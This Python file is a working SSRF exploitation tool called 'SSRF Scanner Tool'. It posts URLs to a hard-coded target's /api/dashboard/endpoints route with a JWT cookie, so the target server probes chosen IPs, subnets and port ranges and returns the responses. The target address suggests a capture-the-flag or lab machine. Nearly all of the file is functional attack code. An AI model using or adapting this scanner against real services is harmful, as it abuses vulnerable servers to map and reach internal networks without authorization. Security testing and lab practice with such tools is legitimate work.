#!/usr/bin/env python3

import argparse
import ipaddress
import requests
import json
from time import sleep
from tqdm import tqdm
from urllib.parse import urlparse
import http.client as http_client
import logging

http_client.HTTPConnection.debuglevel = 0

logging.basicConfig()
logging.getLogger().setLevel(logging.WARN)
requests_log = logging.getLogger("requests.packages.urllib3")
requests_log.setLevel(logging.WARN)
requests_log.propagate = False

# Default values
DEFAULT_SECTOR = "City Center"
DEFAULT_PORT = 80
DEFAULT_DELAY = 0
DEFAULT_TIMEOUT = 0.5
TARGET_HOST = "http://94.237.62.135:41649"
API_ENDPOINT = "/api/dashboard/endpoints"
TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsb2dnZWRJbiI6ZmFsc2UsImFkbWluIjpmYWxzZSwiaWF0IjoxNzUxMDg3MjY5LCJleHAiOjE3NTEwOTA4Njl9.T3z5t5qDFPECwk7zxMh0cs2tIxNdeIBa9G65iKBdAYw"  # Insert your JWT token here

def send_ssrf_request(url, sector=DEFAULT_SECTOR, verbose=False):
    headers = {
        "Content-Type": "application/json",
        "Cookie": f"token={TOKEN}",
    }
    payload = {
        "url": url,
        "sector": sector
    }

    try:
        res = requests.post(
            TARGET_HOST + API_ENDPOINT,
            headers=headers,
            data=json.dumps(payload),
            timeout=DEFAULT_TIMEOUT
        )
        if verbose:
            print(f"[+] {url} → {res.status_code}")
        return {"url": url, "status": res.status_code, "body": res.text}
    except Exception as e:
        if verbose:
            print(f"[-] {url} → error: {e}")
        return {"url": url, "status": "error", "error": str(e)}

def parse_ports(ports_str):
    ports = []
    for part in ports_str.split(","):
        part = part.strip()
        if "-" in part:
            try:
                start, end = part.split("-", 1)
                start, end = int(start), int(end)
                ports.extend(range(start, end + 1))
            except ValueError:
                print(f"[-] Invalid port range: {part}")
        else:
            try:
                ports.append(int(part))
            except ValueError:
                print(f"[-] Invalid port: {part}")
    return ports

def scan_subnet_ports(subnet, ports, delay, verbose):
    ip_net = ipaddress.ip_network(subnet, strict=False)
    ips = [str(ip) for ip in ip_net.hosts()]
    results = []
    for ip in tqdm(ips, desc=f"Scanning subnet {subnet}"):
        for port in ports:
            url = f"http://{ip}:{port}"
            result = send_ssrf_request(url, verbose=verbose)
            results.append(result)
            sleep(delay)
    return results

def scan_ports(ip, ports, delay, verbose):
    results = []
    for port in tqdm(ports, desc=f"Scanning ports on {ip}"):
        url = f"http://{ip}:{port}"
        result = send_ssrf_request(url, verbose=verbose)
        results.append(result)
        sleep(delay)
    return results

def main():
    parser = argparse.ArgumentParser(
        description="SSRF Scanner Tool",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    parser.add_argument("--url", help="Full URL to scan (overrides --ip and port options)")
    parser.add_argument("--ip", help="Single IP address to scan")
    parser.add_argument("--port", type=int, help="Single port to scan")
    parser.add_argument("--ports", help="Comma-separated list of ports to scan, supports ranges like 80,443,8000-8100")
    parser.add_argument("--portrange", help="Port range to scan, e.g. 8000-8100 (alternative to --ports)")
    parser.add_argument("--subnet", help="CIDR subnet to scan, e.g. 192.168.100.0/24")
    parser.add_argument("--delay", type=float, default=DEFAULT_DELAY, help="Delay between requests (seconds)")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose output")
    parser.add_argument("--output", help="Output file to save results (JSON)")

    args = parser.parse_args()

    # Determine ports to scan
    if args.port:
        ports = [args.port]
    elif args.ports:
        ports = parse_ports(args.ports)
    elif args.portrange:
        try:
            start, end = map(int, args.portrange.split("-"))
            ports = list(range(start, end + 1))
        except Exception:
            print("[-] Invalid --portrange format. Use start-end, e.g. 8000-8100")
            return
    else:
        ports = [DEFAULT_PORT]

    results = []

    # Priority: --url overrides everything
    if args.url:
        # Validate URL scheme, add http if missing
        parsed = urlparse(args.url)
        if not parsed.scheme:
            full_url = "http://" + args.url
        else:
            full_url = args.url
        results.append(send_ssrf_request(full_url, verbose=args.verbose))

    elif args.subnet:
        results = scan_subnet_ports(args.subnet, ports, args.delay, args.verbose)

    elif args.ip:
        results = scan_ports(args.ip, ports, args.delay, args.verbose)

    else:
        print("[-] You must specify --url or --ip or --subnet")
        return

    # Output results
    if args.output:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=2)
        print(f"[+] Results saved to {args.output}")
    else:
        for result in results:
            try:
                body = json.loads(result.get("body", "{}"))
                print(result.get("body"))
            except json.JSONDecodeError:
                print(result.get("body"))

if __name__ == "__main__":
    main()